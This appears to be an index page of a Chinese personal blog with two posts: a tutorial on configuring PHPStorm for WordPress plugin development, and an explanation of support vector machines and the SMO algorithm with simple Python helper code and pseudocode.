<!DOCTYPE html>




<html class="theme-next pisces" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="kidozh的一些想法和随手笔记">
<meta property="og:type" content="website">
<meta property="og:title" content="kidozh">
<meta property="og:url" content="https://kidozh.github.io/page/5/index.html">
<meta property="og:site_name" content="kidozh">
<meta property="og:description" content="kidozh的一些想法和随手笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="kidozh">
<meta name="twitter:description" content="kidozh的一些想法和随手笔记">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: false,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://kidozh.github.io/page/5/"/>





  <title>kidozh</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">kidozh</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">某不科学的kidozh</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/07/27/phpstorm-e5-bc-80-e5-8f-91wordpress/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/07/27/phpstorm-e5-bc-80-e5-8f-91wordpress/" itemprop="url">phpstorm开发wordpress</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-07-27T17:56:40+08:00">
                2016-07-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/网页/" itemprop="url" rel="index">
                    <span itemprop="name">网页</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>众所周知，phpstorm是一个非常易用的PHP的IDE，而wordpress则是一款比较常见的博客后台。这里就可以使用PHPStorm来开发wordpress（比如插件，主题以及核心）。</p>
<h1 id="把wordpress集成到一个现存的PHPStorm工程"><a href="#把wordpress集成到一个现存的PHPStorm工程" class="headerlink" title="把wordpress集成到一个现存的PHPStorm工程"></a>把wordpress集成到一个现存的PHPStorm工程</h1><p>你可以这样创建一个WordPress插件工程。</p>
<p><img src="/wp-content/uploads/2016/07/创建WordPress.png" alt="创建WordPress"></p>
<p>当你就绪的工程被认为是wordPress的插件的时候，你就能够在事件日志（Event Log）中启用对于WordPress的支持。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_enable_integration.png?version=1&amp;modificationDate=1395243268000&amp;api=v2" alt=""></p>
<p>你需要提供WordPress的一个安装路径（也就是WordPress的根目录，里面需要包含wp-admin和wp-include这两个子文件夹）</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_enable_integration_dialog.png?version=1&amp;modificationDate=1395243403000&amp;api=v2" alt=""></p>
<p>WordPress集成可以在<code>Setting/WordPress</code>下设置：</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_integration_settings.png?version=1&amp;modificationDate=1395243492000&amp;api=v2" alt=""></p>
<p>而在我的PHPStorm里是这样的：<img src="/wp-content/uploads/2016/07/WordPress设置-1-1024x693.jpg" alt="WordPress设置"></p>
<h1 id="创建一个WordPress的新插件"><a href="#创建一个WordPress的新插件" class="headerlink" title="创建一个WordPress的新插件"></a>创建一个WordPress的新插件</h1><p>新的WordPress插件可以在欢迎屏幕中通过选择<code>File | New Project</code>来创建。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorual_new_project_plugin.png?version=1&amp;modificationDate=1395243626000&amp;api=v2" alt=""></p>
<p>工程类型应该被设置为WordPress Plugin。在点到OK之后，你需要提供WordPress的安装路径。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_new_project_plugin_path.png?version=1&amp;modificationDate=1395243763000&amp;api=v2" alt=""></p>
<p>初始的插件文件就会被自动创建（插件名称和一个合适的元信息摘要）</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_new_project_structure.png?version=1&amp;modificationDate=1395243914000&amp;api=v2" alt=""></p>
<h1 id="开发环境的配置"><a href="#开发环境的配置" class="headerlink" title="开发环境的配置"></a>开发环境的配置</h1><p>不管你是否做了上面的事情，IDE都会检查开发环境是否为WordPress开发所正确配置。如果配置不满足要求的话，气泡就会弹出一个修复的建议。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_enable_integration_event_log.png?version=1&amp;modificationDate=1395244820000&amp;api=v2" alt=""></p>
<h2 id="路径配置"><a href="#路径配置" class="headerlink" title="路径配置"></a>路径配置</h2><p>你所处于的<code>wp-content</code>文件夹和插件需要都在WordPress安装文件夹之外。为了利用PHPStorm的智能代码，代码补全还有其他特征，WordPress的安装文件夹需要包含在外部引用中。只要WordPress安装路径在WordPress集成配置之中提供了，IDE把WordPress安装路径添加到你工程的<code>Include Path</code>之中。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_include_path_notification.png?version=1&amp;modificationDate=1395245104000&amp;api=v2" alt=""></p>
<p>你也可以在<code>Setting | PHP | Include Path</code>中变更Include Path：</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_include_path_settings.png?version=1&amp;modificationDate=1395245203000&amp;api=v2" alt=""></p>
<p>在这个使用案例之中，WordPress安装路径需要被添加到一个外部库之中（此时所有WordPress核心文件夹都被索引了），但是其他的插件和主题默认是不会被添加了，并且为了把他们安装到<code>Settings | PHP | Include path</code>之中。</p>
<h2 id="内容根目录配置"><a href="#内容根目录配置" class="headerlink" title="内容根目录配置"></a>内容根目录配置</h2><p>如果你开发的WordPress插件安装在WordPress安装文件夹之中，IDE就会建议把整个WordPress安装目录加到目录之中接着移除初始文件根目录。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_content_root_notification.png?version=1&amp;modificationDate=1395245507000&amp;api=v2" alt=""></p>
<p>内容目录也可以在<code>Setting | Directories</code>中设置：</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_settings_directories_content_root.png?version=1&amp;modificationDate=1395245612000&amp;api=v2" alt=""></p>
<h2 id="WordPress代码风格"><a href="#WordPress代码风格" class="headerlink" title="WordPress代码风格"></a>WordPress代码风格</h2><p>当WordPress集成被启用之后，你就能够基于代码格式来设置WordPress的代码风格。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_coding_style_notification.png?version=1&amp;modificationDate=1395249434000&amp;api=v2" alt=""></p>
<p>代码风格可以在Setting | Code Style | PHP 中重新配置。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_set_code_style.png?version=3&amp;modificationDate=1395249724000&amp;api=v2" alt=""></p>
<h1 id="WordPress钩子函数的支持"><a href="#WordPress钩子函数的支持" class="headerlink" title="WordPress钩子函数的支持"></a>WordPress钩子函数的支持</h1><h2 id="WordPress的action和filter函数参数的补齐"><a href="#WordPress的action和filter函数参数的补齐" class="headerlink" title="WordPress的action和filter函数参数的补齐"></a>WordPress的action和filter函数参数的补齐</h2><p>所有在WordPress核心函数以及插件的钩子函数都会被IDE检索，并且钩子名称也可以使用Ctrl+Space来补齐<code>add_action</code>和<code>add_filter</code>的参数。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_hook_completion.png?version=1&amp;modificationDate=1395318637000&amp;api=v2" alt=""></p>
<h2 id="action和filter钩子函数的导航"><a href="#action和filter钩子函数的导航" class="headerlink" title="action和filter钩子函数的导航"></a>action和filter钩子函数的导航</h2><p>从WordPress的钩子注册中你从一个导航图标可以寻找到其来源。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_hook_invokation_nav.png?version=1&amp;modificationDate=1395319085000&amp;api=v2" alt=""></p>
<p>你可以在特定的一行中找到来源：</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_hook_invokation_nav_res.png?version=2&amp;modificationDate=1395319196000&amp;api=v2" alt=""></p>
<h2 id="钩子函数注册的回调函数"><a href="#钩子函数注册的回调函数" class="headerlink" title="钩子函数注册的回调函数"></a>钩子函数注册的回调函数</h2><p>第二个钩子函数参数如果被声明是一个函数(<code>add_action</code>和<code>add_filter</code>)的话，你可以使用<code>Ctrl+B</code>或者<code>Ctrl+单击</code>来查看这个函数的来源。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_goto_declaration.png?version=1&amp;modificationDate=1395319687000&amp;api=v2" alt=""></p>
<p>你可以点击这个名称到相关函数的声明处。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_goto_declaration_res.png?version=1&amp;modificationDate=1395319758000&amp;api=v2" alt=""></p>
<h2 id="钩子函数的导航"><a href="#钩子函数的导航" class="headerlink" title="钩子函数的导航"></a>钩子函数的导航</h2><p>通过在<code>Ctrl+Alt+Shift+N</code>键（<code>Navigate | Symbol</code>），你就能够轻松的搜索钩子并且轻松的找到他们。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_goto_symbol.png?version=1&amp;modificationDate=1395320131000&amp;api=v2" alt=""></p>
<p>你也可以使用双击<code>Shift</code>来找到钩子函数。如果有必要的话，同样需要确保开启纳入非工程文件选项。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_goto_symbol_everywhere.png?version=3&amp;modificationDate=1395320419000&amp;api=v2" alt=""></p>
<h2 id="找到钩子注册函数的用法"><a href="#找到钩子注册函数的用法" class="headerlink" title="找到钩子注册函数的用法"></a>找到钩子注册函数的用法</h2><p>你也可以使用<code>Alt+F7</code>来找到钩子函数的用法，这样会提供一系列可能的选项（在<code>find usage of XXX</code>中找到）</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_find_usages.png?version=1&amp;modificationDate=1395321271000&amp;api=v2" alt=""></p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_find_usages_options.png?version=2&amp;modificationDate=1395321325000&amp;api=v2" alt=""></p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_find_usages_results.png?version=1&amp;modificationDate=1395321335000&amp;api=v2" alt=""></p>
<h2 id="从WordPress-org上找到详情"><a href="#从WordPress-org上找到详情" class="headerlink" title="从WordPress.org上找到详情"></a>从WordPress.org上找到详情</h2><p>WordPress文档可以在IDE通过搜索文档上得到消息，你需要做的仅仅是选择你所需要的文本，右键转到<code>Search on WordPress.org</code>就可以了。</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_search_wordpress_org.png?version=1&amp;modificationDate=1395321743000&amp;api=v2" alt=""></p>
<p>默认浏览器也能够接受到IDE的请求，并且访问请求</p>
<p><img src="http://confluence.jetbrains.com/download/attachments/53335443/wordpress_tutorial_search_wordpress_org_res.png?version=1&amp;modificationDate=1395321890000&amp;api=v2" alt=""></p>
<h1 id="WordPress命令行WP-CLI集成"><a href="#WordPress命令行WP-CLI集成" class="headerlink" title="WordPress命令行WP-CLI集成"></a>WordPress命令行WP-CLI集成</h1>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://kidozh.github.io/2016/07/21/e6-94-af-e6-8c-81-e5-90-91-e9-87-8f-e8-87-aa-e5-8a-a8-e6-9c-ba/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="kido zhang">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="kidozh">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/07/21/e6-94-af-e6-8c-81-e5-90-91-e9-87-8f-e8-87-aa-e5-8a-a8-e6-9c-ba/" itemprop="url">支持向量自动机</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-07-21T19:10:40+08:00">
                2016-07-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/深度学习/" itemprop="url" rel="index">
                    <span itemprop="name">深度学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SVM，支持向量自动机，是目前分类器不加修改可以直接使用的最好的现成的分类器。其中最流行的一种实现，也就是序列最小优化(Sequential Minimal Optimization)算法。</p>
<h1 id="基于最大间隔分隔数据"><a href="#基于最大间隔分隔数据" class="headerlink" title="基于最大间隔分隔数据"></a>基于最大间隔分隔数据</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>泛化错误率低，计算开销不打，结果易解释。</p>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>对参数调节和核函数的选择比较敏感，原始分类器不加修改的话只能用于处理二类问题</p>
<h3 id="适用类型"><a href="#适用类型" class="headerlink" title="适用类型"></a>适用类型</h3><p>数值型和标称型数据</p>
<h2 id="线性可分"><a href="#线性可分" class="headerlink" title="线性可分"></a>线性可分</h2><p>我们首先需要解释线性可分的这个概念，先考虑A中两组数据，它们之间已经分隔的足够开，因此很容易可以在途中画出一条曲线将这两组数据点分开。这种情况下，这组数据被成为线性可分（linearly separable）数据。</p>
<p><img src="/wp-content/uploads/2016/07/linearly-separable.png" alt="linearly separable"></p>
<p>上述将数据集分隔开来的直线成为分隔超平面（separating hyperplane）。在上面给出的例子中，由于数据点都在二维平面上，所以此时分隔超平面就只是一条直线。但是，如果所给的数据是三维的，那么就是一个平面。这个时候分隔超平面也就是作为分类的决策边界，分布在超平面一侧的所有数据都属于某个类别，而分布在另一侧的所有数据则属于另一个类别。</p>
<p>下面给出了线性可分的数据集的几种划分方式。</p>
<p><img src="/wp-content/uploads/2016/07/divide.png" alt="divide"></p>
<p>这个时候，如果数据点离决策边界越远，那么其最后的预测结果也就越可信。但是考虑到B到D中的三条直线，他们都能够将数据分隔开，但是哪个会更好呢？是不是有点寻找最佳拟合直线的感觉，是的，上述做法确实有点像直线拟合，但这并不是最佳的方案。这个时候我们希望找到离分隔超平面最近的点，确保他们离分隔面的距离尽可能的远。同时我们也希望间隔尽可能的大，这样我们的分类器也能足够的健壮。</p>
<p>支持向量就是离分隔超平面最近的那些点。接下来试着就需要最大化支持向量到分隔面的距离。</p>
<h1 id="寻找最大间隔"><a href="#寻找最大间隔" class="headerlink" title="寻找最大间隔"></a>寻找最大间隔</h1><p>分隔超平面的形式可以写成( w^{T}x+b )。如果要计算点A到分隔超平面的距离，就必须给出点到分隔面的法线或者垂线的长度。这个值应该是( |w^{T}A+b|/||w|| )。这里的常熟b类似于logistic回归中的截距。这里向量w和b一起描述了所给数据的分割线或者超平面。<img src="/wp-content/uploads/2016/07/function-distance.png" alt="function distance"></p>
<h2 id="分类器求解的优化问题"><a href="#分类器求解的优化问题" class="headerlink" title="分类器求解的优化问题"></a>分类器求解的优化问题</h2><p>输入数据给分类器会输出一个类别标签，这相当于一个Sigmoid的函数在作用。下面将使用类似单位阶跃函数的函数对( w^{T}x+b )作用得到( f(w^{T}x+b) )，其中当u&lt;0时候f(u)输出-1，反之则输出+1。这和前一章的Logistic回归有所不同，那里的类别标签是0和1。</p>
<p>这里的类别标签为什么采用-1和+1而不采用0和1呢？这是由于-1和+1仅仅相差一个符号方便数学上的处理，这个时候可以通过一个统一的公式来表示间隔或者数据点到分隔超平面的距离，同时不需要担心数据到底是属于+1还是-1.</p>
<p>当计算数据点到分隔面的距离并且确定分隔面的放置位置时候，间隔通过( label\times (w^{T}x+b) )来计算，这个时候就能体现出-1和+1类的好处了。如果数据点处于正方向并且离分隔超平面很远的位置时候，( w^{T}x+b )将会是一个很大的正数，同时( label\times (w^{x}+b) )也会是一个很大的正数。如果处于负方向并且离超平面很远的位置的时候，类别标签是-1，则( label\times (w^{T}x+b))仍然是一个很大的正数。</p>
<p>现在的目标就是找出分类器定义的w和b。为此，我们必须找到具有最小间隔的数据点，这些数据点也就是前面提到的支持向量。一旦找到具有最小间隔的数据点，我们就需要对这个间隔最大化，这样可以写作：[ \arg \max\limits<em>{w,k}\left\lbrace \min\limits</em>{n}(label\cdot (w^{T}x+b))\cdot \frac{1}{\left| \left| w\right| \right| } \right\rbrace]直接求解上述问题相当困难，所以我们将其转换成一个更容易求解的方法。首先考虑一下式子中大括号的部分。由于对乘积进行优化是一种很复杂的事情，因此我们要做的事情就是固定其中的一个因子来最大化另一个因子。如果令所有支持向量的( label \times (w<em>{T}x+b))都等于1，那么就可以通过(||w||</em>{-1})的最大值来的到最终解。但是并非所有的数据点( label \times (w<em>{T}x+b))都等于1，只有那些离分隔超平面最近的点得到的值才是1。离超平面越远的数据点，其( label \times (w</em>{T}x+b))的值也越大。</p>
<p>再上面的优化问题中，给定了一些约束条件然后求最优值，因此该问题是一个带约束条件的优化问题。这里的约束条件就是( label*(w^{T}x+b)\geq 1.0 )。对于此类优化问题，有一个非常著名的求解方法，就是拉格朗日乘子法。通过引入拉格朗日乘子，我们就可以基于约束条件来表述原来的问题。由于这里的约束条件都是基于数据点的，因此我们就可以把超平面写成数据点的形式。于是优化目标函数可以写成：[\max\limits<em>{\alpha}\left[ \sum</em>{i=1}^{m}\alpha -\frac{1}{2}\sum<em>{i,j=1}^{m}label^{(i)}\cdot label^{(j)}\cdot a</em>{i}\cdot a<em>{j}\left\langle x^{(i)},x^{(j)} \right\rangle\right]]其约束条件为：[\alpha \geq 0,\sum</em>{i-1}^{m}\alpha_{i}\cdot label^{(i)}=0]</p>
<p>至此，这个非常完美，但是这里有个假设就是：数据必须是100%线性可分。目前未知，我们都知道所有的数据都不那么干净，所以我们可以通过引入所谓的松弛变量(slack variable)，来允许有些数据点可以处于分隔面的错误的一侧。这样我们的优化目标就能过保持不变，但是此时的约束条件则变为：[C\geq\alpha \geq 0,\sum<em>{i-1}^{m}\alpha</em>{i}\cdot label^{(i)}=0]这里的常数C用于控制最大化间隔和保证大部分的函数间隔小于1.0这两个目标的权重。在优化算法的实现算法的实现代码中，常数C是一个参数，因此我们就可以通过调节这个参数得到不同的结果，一但求出了所有的alpha，那么分隔超平面就可以通过这些alpha表达。这个问题十分直接，SVM中的主要工作就是求出这些alpha。</p>
<h2 id="SVM应用的一般框架"><a href="#SVM应用的一般框架" class="headerlink" title="SVM应用的一般框架"></a>SVM应用的一般框架</h2><p>我们需要给出SVM的一般流程：</p>
<ol>
<li>收集数据：任何方法</li>
<li>准备数据：需要数值型数据</li>
<li>分析数据：有助于可视化分隔超平面</li>
<li>训练算法：SVM大部分时间都源于训练，这个过程主要实现两个参数的调优</li>
<li>测试算法：十分简单的计算过程就能够实现</li>
<li>使用算法：几乎所有分类问题都可以使用SVM，值得一提的是，SVM本身就是一个二类分类器，对多类问题则需要修改代码。</li>
</ol>
<h1 id="SMO的高效优化算法"><a href="#SMO的高效优化算法" class="headerlink" title="SMO的高效优化算法"></a>SMO的高效优化算法</h1><p>我们所需要做的围绕优化的事情就是训练分类器，一旦得到了alpha的最优值，我们就能够得到了分隔超平面（二维平面就是直线）并能用于数据分类。</p>
<h2 id="Platt的SMO算法"><a href="#Platt的SMO算法" class="headerlink" title="Platt的SMO算法"></a>Platt的SMO算法</h2><p>SMO，序列最小化。Platt的SMO算法是将大优化问题分解为小优化问题来求解的。这些小问题是比较容易求解的，并且对顺序求解的结果于将他们作为整体求解的结果是完全一致的。在结果完全相同的时候，SMO的算法的求解时间会短很多。</p>
<h2 id="应用简化版算法处理小规模数据集"><a href="#应用简化版算法处理小规模数据集" class="headerlink" title="应用简化版算法处理小规模数据集"></a>应用简化版算法处理小规模数据集</h2><p>简化版代码虽然量少但是执行速度慢。Platt SMO算法中的外循环需要确定最佳alpha对。而简化版则会跳过这个部分，首先直接在数据集上遍历每个alpha，然后在剩下的alpha集合中随机选择另一个alpha，从而构建alpha对。这里，我们需要同时改变两个alpha。之所以这样做是因为我们有个约束条件[\sum \alpha_{i}\cdot label^{(i)}=0]由于改变一个alpha可能会导致约束条件失效，所以我们总是同时改变两个alpha。</p>
<p>为此我们将构建一个辅助函数，用于在某个区间范围内随机选择一个整数。同时也需要另一个辅助函数，用于在数值很大时候对其进行调整。下面的程序清单给出了这两个函数的实现。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadDataSet</span><span class="params">(fileName)</span>:</span></div><div class="line">    dataMat = []; labelMat = []</div><div class="line">    fr = open(fileName)</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> fr.readlines():</div><div class="line">        lineArr = line.strip().split(<span class="string">'\t'</span>)</div><div class="line">        dataMat.append([float(lineArr[<span class="number">0</span>]), float(lineArr[<span class="number">1</span>])])</div><div class="line">        labelMat.append(float(lineArr[<span class="number">2</span>]))</div><div class="line">    <span class="keyword">return</span> dataMat,labelMat</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectJrand</span><span class="params">(i,m)</span>:</span></div><div class="line">    j=i <span class="comment">#we want to select any J not equal to i</span></div><div class="line">    <span class="keyword">while</span> (j==i):</div><div class="line">        j = int(random.uniform(<span class="number">0</span>,m))</div><div class="line">    <span class="keyword">return</span> j</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clipAlpha</span><span class="params">(aj,H,L)</span>:</span></div><div class="line">    <span class="keyword">if</span> aj &gt; H: </div><div class="line">        aj = H</div><div class="line">    <span class="keyword">if</span> L &gt; aj:</div><div class="line">        aj = L</div><div class="line">    <span class="keyword">return</span> aj</div></pre></td></tr></table></figure></p>
<p>在testSet.txt文件中保存了之前图片中的数据。接下来我们就将在这个文见上应用SMO算法。第一个函数就是之前熟悉的<code>loadDatSet()</code>，这个函数打开文件并且逐行解析，从而得到每行的类标签和整个数据矩阵。</p>
<p>下一个函数<code>selectJrand()</code>有两个参数值，其中i是第一个alpha的下标，m是所有alpha的数目。只要函数值不等于输入值i，函数就会随机选择。</p>
<p>最后一个辅助函数就是<code>clipAlpha()</code>，它是用于调整大于H或者小于L的alpha值。尽管上述3个辅助函数本身做的事情不多，但是用于分类器却很有用处。</p>
<p>在输入并保存程序清单6-1中的代码之后，运行如下命令：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import svmMLiA</div><div class="line">&gt;&gt;&gt; dataArr,labelArr=svmMLiA.loadDataSet(<span class="string">'testSet.txt'</span>)</div><div class="line">&gt;&gt;&gt; labelArr</div><div class="line">[-1.0, -1.0, 1.0, -1.0, 1.0, 1.0, 1.0, -1.0, -1.0, -1.0, -1.0, -1.0, -1.0, 1.0, -1.0, 1.0, 1.0, -1.0, 1.0, -1.0, -1.0, -1.0, 1.0, -1.0, -1.0, 1.0, 1.0, -1.0, -1.0, -1.0, -1.0, 1.0, 1.0, 1.0, 1.0, -1.0, 1.0, -1.0, -1.0, 1.0, -1.0, -1.0, -1.0, -1.0, 1.0, 1.0, 1.0, 1.0, 1.0, -1.0, 1.0, 1.0, -1.0, -1.0, 1.0, 1.0, -1.0, 1.0, -1.0, -1.0, -1.0, -1.0, 1.0, -1.0, 1.0, -1.0, -1.0, 1.0, 1.0, 1.0, -1.0, 1.0, 1.0, -1.0, -1.0, 1.0, -1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, 1.0, -1.0, -1.0, -1.0, -1.0, 1.0, -1.0, 1.0, 1.0, 1.0, -1.0, -1.0, -1.0, -1.0, -1.0, -1.0, -1.0]</div></pre></td></tr></table></figure></p>
<p>可以看的出来，这里采用的类别标签是-1和1，而不是0和1</p>
<p>上述工作完成后，就可以使用SMO算法的第一个版本了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">创建一个alpha向量并将初始化为0向量</div><div class="line">当迭代次数小于最大迭代次数时：</div><div class="line">	对数据集中的每个数据向量：</div><div class="line">		如果该数据向量可以被优化：</div><div class="line">			随机选择另一个数据向量</div><div class="line">			同时优化这两个向量</div><div class="line">			如果两个向量都不能被优化，退出内循环</div><div class="line">	如果所有向量都没有被优化，增加迭代次数，继续下一次循环</div></pre></td></tr></table></figure></p>
